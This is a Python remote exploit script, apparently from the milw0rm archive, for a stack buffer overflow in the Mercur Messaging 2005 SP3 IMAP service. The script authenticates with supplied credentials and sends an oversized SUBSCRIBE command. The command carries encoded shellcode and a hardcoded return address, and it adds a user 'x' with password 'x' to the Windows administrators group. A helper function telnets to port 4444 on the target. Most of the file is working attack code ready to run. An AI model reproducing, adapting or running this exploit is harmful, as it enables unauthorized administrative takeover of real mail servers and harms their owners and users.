#!/usr/bin/python
# Remote exploit for the stack overflow vulnerability in Mercur Messaging 2005
# SP3 IMAP service. The exploit was tested on windows 2000 server SP4 in a
# Vmware environment. At the time of overflow EBX points to our shellcode.
# However this buffer into which EBX points will give a maximum of 224 bytes of
# uninterrupted space for shellcode. So for my analysis is settled for a useradd
# shellcode which comes to 224 bytes :-). However looking at it a little bit
# further i found that you can send SUBSCRIBE request just before the actual
# command that causes the overflow and you have a shellcode space of 520 bytes
# further down the stack. So you can club the 224 bytes you get at overflow time
# with this 520 and use a two stage shellcode. Too tired for that stunt so
# wrote this exploit which add user x with password x to the admin group. Too
# tired that i did not even clean up the code from the junk i used. You need to
# have a valid IMAP account for this exploit to work.
#
# Author shall bear no reponsibility for any screw ups caused by using this code
# Winny Thomas :-)
#
import os
import sys
import time
import socket
import struct

shellcode = "\x33\xc9\x83\xe9\xce\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa4"
shellcode += "\xa1\x39\xec\x83\xeb\xfc\xe2\xf4\x58\x49\x7d\xec\xa4\xa1\xb2\xa9"
shellcode += "\x98\x2a\x45\xe9\xdc\xa0\xd6\x67\xeb\xb9\xb2\xb3\x84\xa0\xd2\xa5"
shellcode += "\x2f\x95\xb2\xed\x4a\x90\xf9\x75\x08\x25\xf9\x98\xa3\x60\xf3\xe1"
shellcode += "\xa5\x63\xd2\x18\x9f\xf5\x1d\xe8\xd1\x44\xb2\xb3\x80\xa0\xd2\x8a"
shellcode += "\x2f\xad\x72\x67\xfb\xbd\x38\x07\x2f\xbd\xb2\xed\x4f\x28\x65\xc8"
shellcode += "\xa0\x62\x08\x2c\xc0\x2a\x79\xdc\x21\x61\x41\xe0\x2f\xe1\x35\x67"
shellcode += "\xd4\xbd\x94\x67\xcc\xa9\xd2\xe5\x2f\x21\x89\xec\xa4\xa1\xb2\x84"
shellcode += "\x98\xfe\x08\x1a\xc4\xf7\xb0\x14\x27\x61\x42\xbc\xcc\x51\xb3\xe8"
shellcode += "\xfb\xc9\xa1\x12\x2e\xaf\x6e\x13\x43\xc2\x54\x88\x8a\xc4\x41\x89"
shellcode += "\x84\x8e\x5a\xcc\xca\xc4\x4d\xcc\xd1\xd2\x5c\x9e\x84\xd9\x19\x94"
shellcode += "\x84\x8e\x78\xa8\xe0\x81\x1f\xca\x84\xcf\x5c\x98\x84\xcd\x56\x8f"
shellcode += "\xc5\xcd\x5e\x9e\xcb\xd4\x49\xcc\xe5\xc5\x54\x85\xca\xc8\x4a\x98"
shellcode += "\xd6\xc0\x4d\x83\xd6\xd2\x19\x94\x84\x8e\x78\xa8\xe0\xa1\x39\xec"

def ExploitMercur(target, username, passwd):
       sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       sock.connect((target, 143))
       response = sock.recv(1024)
       print response

       login = 'a001 LOGIN ' + username + ' ' + passwd + '\r\n'
       sock.send(login)
       response = sock.recv(1024)
       print response

       payload = shellcode
       payload += 'L' * 3
       payload += struct.pack('<L', 0x7C577B03)
       payload += 'Y' * 4
       payload += 'Z' * 4
       payload += 'L' *  25
       payload += 'M' *  16

       payload += ' ' + '\"/\"' + ' ' + '\"\"'
       req = 'a001 SUBSCRIBE ' + payload + '\r\n'
       sock.send(req)
       sock.close()
       print 'User x added with passwd x to administrator group'

def ConnectRemoteShell(target):
       connect = "/usr/bin/telnet " + target + " 4444"
       os.system(connect)

if __name__=="__main__":
       try:
               target = sys.argv[1]
               username = sys.argv[2]
               passwd = sys.argv[3]
       except IndexError:
               print 'Usage: %s <imap server> <username> <password>\n' % sys.argv[0]
               sys.exit(-1)

       ExploitMercur(target, username, passwd)

# milw0rm.com [2007-03-21]